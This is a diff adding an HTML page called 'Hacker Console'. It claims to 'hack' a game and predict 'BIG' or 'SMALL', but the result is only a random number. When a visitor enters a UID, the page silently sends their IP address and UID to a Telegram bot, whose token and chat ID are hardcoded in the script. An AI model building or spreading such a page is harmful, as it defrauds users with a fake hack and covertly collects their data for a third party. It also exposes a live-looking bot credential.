@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacker Console</title>
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+    body { background: #000; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; position: relative; }
+    #particles-js { position: absolute; width: 100%; height: 100%; background: #000; z-index: 0; }
+    .container { width: 90%; max-width: 450px; padding: 20px; text-align: center; background: rgba(0, 0, 0, 0.8); border-radius: 12px; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; position: relative; z-index: 1; }
+    .input-field { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 2px solid #00ff00; background: #000; color: #00ff00; font-size: 16px; text-align: center; }
+    .button { background: #00ff00; border: none; color: #000; padding: 12px; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 18px; margin-top: 10px; width: 100%; transition: 0.3s; }
+    .button:hover { background: #0f0; transform: scale(1.05); }
+    .hacking-text { font-size: 16px; text-align: left; height: 150px; overflow: hidden; border: 1px solid #00ff00; padding: 10px; background: rgba(0, 0, 0, 0.8); margin-top: 10px; border-radius: 5px; }
+    .box { background: rgba(0, 255, 0, 0.2); padding: 10px; margin: 15px 0; border-radius: 8px; font-size: 20px; font-weight: bold; text-transform: uppercase; border: 2px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
+  </style>
+</head>
+<body>
+
+  <div id="particles-js"></div>
+
+  <div class="container" id="loginPage">
+    <h2>Enter UID</h2>
+    <input type="text" class="input-field" id="uid" placeholder="Enter Your UID">
+    <button class="button" onclick="login()">Login</button>
+  </div>
+
+  <div class="container" id="dashboard" style="display: none;">
+    <h2>Hacker Console</h2>
+    <div class="hacking-text" id="hackingText">Initializing Hack...</div>
+    <button class="button" onclick="startHacking()">START</button>
+    <div class="box">Result: <span id="currentResult">Waiting...</span></div>
+    <button class="button" onclick="goBack()">Go Back</button>
+  </div>
+
+  <script>
+    async function getIPAddress() {
+      try {
+        let response = await fetch("https://api64.ipify.org?format=json");
+        let data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error("Error fetching IP:", error);
+        return "Unknown";
+      }
+    }
+
+    function getLoginData() {
+      let data = JSON.parse(localStorage.getItem("loginData")) || { count: 0, lastLogin: Date.now() };
+      return data;
+    }
+
+    function updateLoginData() {
+      let data = getLoginData();
+      let now = Date.now();
+
+      if (now - data.lastLogin > 24 * 60 * 60 * 1000) {
+        data.count = 0;
+      }
+
+      data.count += 1;
+      data.lastLogin = now;
+      localStorage.setItem("loginData", JSON.stringify(data));
+
+      return data.count;
+    }
+
+    function isIPBlocked() {
+      let data = getLoginData();
+      return data.count > 20;
+    }
+
+    async function sendToTelegram(uid, type) {
+      let botToken = "7767023359:AAGdUDLsHZDuruNQeoPNlLJmHmFXBPASbA8";
+      let chatID = "6594454067";
+      let ip = await getIPAddress();
+
+      let message = type === "block" 
+        ? `🚨 IP BLOCKED!\n🆔 UID: ${uid}\n📌 IP: ${ip}\n❌ Exceeded Login Limit!`
+        : `🔓 NEW LOGIN\n🆔 UID: ${uid}\n📌 IP: ${ip}`;
+
+      let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
+
+      fetch(url).then(response => console.log("Message sent to Telegram"));
+    }
+
+    async function login() {
+      let uid = document.getElementById("uid").value;
+
+      if (uid.length >= 6 && /^\d+$/.test(uid)) {
+        if (isIPBlocked()) {
+          alert("⚠️ IP Blocked! Try again later.");
+          await sendToTelegram(uid, "block");
+          return;
+        }
+
+        updateLoginData();
+        await sendToTelegram(uid, "login");
+
+        document.getElementById("loginPage").style.display = "none";
+        document.getElementById("dashboard").style.display = "block";
+      } else {
+        alert("❌ Invalid UID! Must be at least 6 digits.");
+      }
+    }
+
+    function startHacking() {
+      let hackingText = document.getElementById("hackingText");
+      let result = document.getElementById("currentResult");
+
+      hackingText.innerHTML = "Working Hack...";
+      result.innerText = "Waiting...";
+
+      setTimeout(() => {
+        let finalResult = Math.random() < 0.4 ? "BIG" : "SMALL";
+        result.innerText = finalResult;
+      }, 3000);
+    }
+
+    function goBack() {
+      document.getElementById("dashboard").style.display = "none";
+      document.getElementById("loginPage").style.display = "block";
+    }
+
+    particlesJS('particles-js', { particles: { number: { value: 50 }, size: { value: 3 } } });
+  </script>
+
+</body>
+</html>
